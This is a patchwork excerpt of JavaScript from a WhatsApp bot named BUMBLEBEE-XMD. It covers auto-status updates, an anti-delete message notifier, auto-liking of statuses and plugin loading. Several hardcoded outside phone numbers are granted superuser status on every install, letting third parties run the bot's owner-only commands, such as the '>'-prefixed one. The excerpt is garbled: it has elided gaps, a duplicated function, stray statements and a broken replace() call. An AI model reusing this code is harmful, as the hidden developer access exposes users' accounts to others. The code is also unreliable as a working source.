...
if (conf.AUTOBIO === 'yes') {
    setInterval(() => {
      ...
      zk.updateProfileStatus(
        `${conf.OWNER_NAME} GOD BLESS MY HUSTLE FROM BLACKTAPPY  ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
      );
    }, 10 * 1000);
  }
...
function createNotification(deletedMessage) {
  ...
  let notification = `*😈 BUMBLEBEE-XMD ANTIDELETE👿*\n\n`;
  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by BUMBLEBEE-XMD*\n\n`;
  return notification;
}
...
function createNotification(deletedMessage) {
  const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
  let notification = `*😈BUMBLEBEE ANTIDELETE👿*\n\n`;
  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by BUMBLEBEE-XMD*\n\n`;
  return notification;
}
...
if (conf.AUTO_LIKE_STATUS === "yes") {
    ...
    zk.ev.on("messages.upsert", async m => {
      ...
      const superUserNumbers = [servBot, "254759000340", '25413192684', '254748387615', "254796299159", '254731326204', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const allAllowedNumbers = superUserNumbers.concat(sudo);
      const superUser = allAllowedNumbers.includes(auteurMessage);
      var dev = ['254769365617', '254731316204', "254796299159", '254759000340'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
      ...
      if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'no') {
        zk.sendMessage(auteurMessage, {
          'text': "🚫am blocking you because you have violated Bumblebee policies🚫!"
        });
...
zk.ev.on("messages.upsert", async (m) => {
  ...
  if (!superUser) {
    return repondre("Only for my owner or BUMBLEBEE-XMD to execute this command 🚫");
  }
...
if (texte && texte.startsWith('>')) {
  ...
  if (!superUser) {
    const menuText = `This command is only for the owner or BUMBLEBEE-XMD to execute 🚫`;
    ...
    await zk.sendMessage(origineMessage, {
      ...
      contextInfo: {
        externalAdReply: {
          ...
          sourceUrl: conf.GURL,
          thumbnailUrl: "https://files.catbox.moe/2w7amm.jpg" || conf.BOT_MENU_LINK,
          mediaType: 1,
...
`;
    ...
    zk.ev.on("connection.update", async con => {
      ...
      if (connection === "connecting") {
        console.log("ℹ️ Bumblebee md connecting in your account...");
      } else if (connection === 'open') {
        
        console.log("✅ Bumblebee Md connected successfully✔");
        console.log("--");
        0;
        ...
        console.log("------------------/-----");
        console.log(" Bumblebee-md installing ${evt.cm.length} plugins😇\n\n");
        ...
        fs.readdirSync(__dirname + "/commands").forEach(fichier => {
          if (path.extname(fichier).toLowerCase() == ".js") {
            try {
              ...
              console.log(fichier + "Successfully installed Bumblebee Md commands✔️");
            } catch (e) {
        ...
        console.log("Bumblebee md successfully connected✅");
        await activateCrons();
const getGreeting = () => {
...
╰═════════════════⊷ `
        ...
        if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
          ...
          console.log('connection error😞 ,,Bumblebee trying to reconnect... ');
          main();
